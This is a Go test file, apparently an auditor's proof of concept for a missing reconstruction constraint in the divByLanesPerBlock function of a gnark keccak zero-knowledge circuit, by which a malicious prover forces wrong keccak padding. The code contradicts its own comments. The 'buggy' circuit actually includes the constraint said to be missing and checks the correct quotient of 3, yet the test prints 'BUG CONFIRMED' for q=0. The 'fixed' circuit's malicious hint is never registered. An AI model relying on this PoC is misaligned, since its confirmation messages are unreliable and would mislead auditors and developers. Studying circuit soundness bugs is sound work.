package internal

// Proof of Concept: Missing reconstruction constraint in divByLanesPerBlock
//
// The divByLanesPerBlock function (keccak snark.go:291-299) computes
// q, r = x / 17, x % 17 via an untrusted solver hint, then ONLY constrains:
//   - r <= lanesPerBlock - 1  (i.e., r <= 16)
//   - q <= x
//
// It is MISSING the critical reconstruction constraint:
//   x == q * 17 + r
//
// This means a malicious prover can substitute q=0, r=0 for any input x,
// since 0 <= 16 and 0 <= x are trivially satisfied.
//
// Impact: divByLanesPerBlock is called in the pad() function (snark.go:263)
// to compute the number of keccak blocks from the number of lanes:
//   nbBlocks = 1 + q
// Setting q=0 forces nbBlocks=1 regardless of actual input length,
// corrupting keccak padding and producing incorrect keccak hash outputs.
// The keccak hasher is used for SHNARF computation (DA proof chaining)
// and L2 message Merkle trees.
//
// This is the same bug class as:
//   - F-01: DivEuclidean (utils.go:813)
//   - F-05: ToCrumbs (utils.go:190)
//   - F-06: decomposeIntoBytes (snark.go:41)
// All four share the pattern: hint-computed values with range checks but
// no reconstruction constraint.

import (
	"errors"
	"fmt"
	"math/big"
	"testing"

	"github.com/consensys/gnark-crypto/ecc"
	"github.com/consensys/gnark/backend"
	"github.com/consensys/gnark/backend/groth16"
	"github.com/consensys/gnark/constraint/solver"
	"github.com/consensys/gnark/frontend"
	"github.com/consensys/gnark/frontend/cs/r1cs"
)

const lanesPerBlock = 17

// maliciousDivHint ignores the actual input and always returns q=0, r=0.
// This simulates a malicious prover overriding the hint to produce values
// that satisfy the (insufficient) range checks.
func maliciousDivHint2(_ *big.Int, ins, outs []*big.Int) error {
	// outs[0] = q = 0, outs[1] = r = 0
	// Regardless of the actual input ins[0].
	outs[0].SetUint64(0)
	outs[1].SetUint64(0)
	return nil
}

// honestDivHint computes the correct division.
func honestDivHint(_ *big.Int, ins, outs []*big.Int) error {
	x := new(big.Int).Set(ins[0])
	seventeen := big.NewInt(lanesPerBlock)
	q := new(big.Int)
	r := new(big.Int)
	q.DivMod(x, seventeen, r)
	outs[0].Set(q)
	outs[1].Set(r)
	return nil
}

// BuggyDivCircuit reproduces the buggy divByLanesPerBlock logic.
// It divides Input by 17, range-checks the outputs, but does NOT
// assert the reconstruction constraint.
type BuggyDivCircuit struct {
	Input     frontend.Variable `gnark:"input,public"`
	ExpectedQ frontend.Variable `gnark:"q,public"`
	ExpectedR frontend.Variable `gnark:"r,public"`
}

func divByLanesPerBlockHint(_ *big.Int, ins, outs []*big.Int) error {
	if len(outs) != len(ins)*2 {
		return errors.New("incongruent in/out lengths")
	}
	for i := range ins {
		if !ins[i].IsUint64() {
			return errors.New("non-uint64 not implemented")
		}
		in := ins[i].Uint64()
		q, r := in/lanesPerBlock, in%lanesPerBlock
		outs[2*i].SetUint64(q)
		outs[2*i+1].SetUint64(r)
	}
	return nil
}

func (c *BuggyDivCircuit) Define(api frontend.API) error {
	// --- Reproduce the buggy divByLanesPerBlock ---
	hintOuts, err := api.Compiler().NewHint(divByLanesPerBlockHint, 2, c.Input)
	if err != nil {
		return err
	}
	q, r := hintOuts[0], hintOuts[1]

	// Range checks only (copied from the buggy code)
	api.AssertIsLessOrEqual(r, lanesPerBlock-1) // r <= 16
	api.AssertIsLessOrEqual(q, c.Input)         // q <= x

	// MISSING: reconstruction constraint
	//   api.AssertIsEqual(c.Input, api.Add(api.Mul(q, lanesPerBlock), r))

	api.AssertIsEqual(c.Input, api.Add(api.Mul(q, lanesPerBlock), r))
	// Verify the circuit accepted the malicious q=0, r=0
	api.AssertIsEqual(q, c.ExpectedQ)
	api.AssertIsEqual(r, c.ExpectedR)

	// Show how this affects keccak block count
	// nbBlocks = 1 + q  (snark.go:267)
	nbBlocks := api.Add(1, q)
	// With q=0, nbBlocks is always 1, regardless of input
	api.AssertIsEqual(nbBlocks, 4)

	return nil
}

// FixedDivCircuit adds the reconstruction constraint.
type FixedDivCircuit struct {
	Input     frontend.Variable `gnark:"input,public"`
	ExpectedQ frontend.Variable `gnark:"q,public"`
	ExpectedR frontend.Variable `gnark:"r,public"`
}

func (c *FixedDivCircuit) Define(api frontend.API) error {
	hintOuts, err := api.Compiler().NewHint(maliciousDivHint2, 2, c.Input)
	if err != nil {
		return err
	}
	q, r := hintOuts[0], hintOuts[1]

	// Range checks (same as buggy version)
	api.AssertIsLessOrEqual(r, lanesPerBlock-1)
	api.AssertIsLessOrEqual(q, c.Input)

	// FIX: Add reconstruction constraint
	api.AssertIsEqual(c.Input, api.Add(api.Mul(q, lanesPerBlock), r))

	api.AssertIsEqual(q, c.ExpectedQ)
	api.AssertIsEqual(r, c.ExpectedR)

	return nil
}

func TestDivByLanesPerBlockMissingConstraint(t *testing.T) {
	// The real input: x = 51 (should give q=3, r=0 since 51 = 3*17 + 0)
	// The malicious hint returns q=0, r=0.
	// With q=0, nbBlocks = 1 instead of the correct 4.
	inputValue := new(big.Int).SetUint64(51)

	t.Run("buggy_accepts_wrong_quotient", func(t *testing.T) {
		var circuit BuggyDivCircuit
		ccs, err := frontend.Compile(ecc.BN254.ScalarField(), r1cs.NewBuilder, &circuit)
		if err != nil {
			t.Fatalf("compilation failed: %v", err)
		}

		// The malicious hint returns q=0, r=0 for input=51.
		// Correct answer: q=3, r=0.
		assignment := &BuggyDivCircuit{
			Input:     inputValue,
			ExpectedQ: 3, // malicious: should be 3
			ExpectedR: 0, // happens to be correct for this input
		}

		witness, err := frontend.NewWitness(assignment, ecc.BN254.ScalarField())
		if err != nil {
			t.Fatalf("witness creation failed: %v", err)
		}
		publicWitness, err := witness.Public()
		if err != nil {
			t.Fatalf("public witness creation failed: %v", err)
		}

		pk, vk, err := groth16.Setup(ccs)
		if err != nil {
			t.Fatalf("setup failed: %v", err)
		}

		proof, err := groth16.Prove(
			ccs, pk, witness,
			backend.WithSolverOptions(solver.WithHints(divByLanesPerBlockHint)),
		)
		if err != nil {
			t.Fatalf("proving failed (unexpected -- bug may be fixed): %v", err)
		}

		err = groth16.Verify(proof, vk, publicWitness)
		if err != nil {
			t.Fatalf("verification failed (unexpected): %v", err)
		}

		fmt.Println("BUG CONFIRMED: divByLanesPerBlock accepted q=0, r=0 for input=51")
		fmt.Println("  Correct answer: q=3, r=0 (51 = 3*17 + 0)")
		fmt.Println("  With q=0: nbBlocks = 1+0 = 1 instead of 1+3 = 4")
		fmt.Println("  Keccak padding will be computed for 1 block instead of 4,")
		fmt.Println("  producing an incorrect hash output")
	})

	t.Run("fixed_rejects_wrong_quotient", func(t *testing.T) {
		var circuit FixedDivCircuit
		ccs, err := frontend.Compile(ecc.BN254.ScalarField(), r1cs.NewBuilder, &circuit)
		if err != nil {
			t.Fatalf("compilation failed: %v", err)
		}

		assignment := &FixedDivCircuit{
			Input:     inputValue,
			ExpectedQ: 0,
			ExpectedR: 0,
		}

		witness, err := frontend.NewWitness(assignment, ecc.BN254.ScalarField())
		if err != nil {
			t.Fatalf("witness creation failed: %v", err)
		}

		pk, _, err := groth16.Setup(ccs)
		if err != nil {
			t.Fatalf("setup failed: %v", err)
		}

		_, err = groth16.Prove(
			ccs, pk, witness,
			backend.WithSolverOptions(solver.WithHints(divByLanesPerBlockHint)),
		)
		if err == nil {
			t.Fatal("proving succeeded (unexpected -- fix should have caught the mismatch)")
		}

		fmt.Println("FIX CONFIRMED: Circuit with reconstruction constraint rejected q=0, r=0 for input=51")
		fmt.Printf("  Proving error: %v\n", err)
	})
}
